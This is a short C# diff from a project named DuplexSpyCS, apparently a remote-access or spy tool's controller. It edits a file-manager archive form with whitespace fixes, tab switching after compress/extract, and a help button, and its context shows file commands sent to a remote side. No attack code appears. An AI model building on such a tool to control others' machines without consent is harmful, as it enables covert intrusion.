@@ -51,7 +51,7 @@ namespace DuplexSpyCS
 
                 return x;
             }
-            
+
             if (l1 != null)
             {
                 foreach (string[] entry in l1)
@@ -145,7 +145,7 @@ namespace DuplexSpyCS
                 else
                     lsFiles.Add(entry[1]);
             }
-            
+
             v.fnSendCommand(string.Join("|", new string[]
             {
                 "file",
@@ -232,11 +232,20 @@ namespace DuplexSpyCS
         private void button1_Click(object sender, EventArgs e)
         {
             FileCompress();
+
+            tabControl1.SelectedIndex = 2;
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
             FileExtract();
+
+            tabControl1.SelectedIndex = 2;
+        }
+
+        private void toolStripButton1_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\FileMgrArchive").Show();
         }
     }
 }
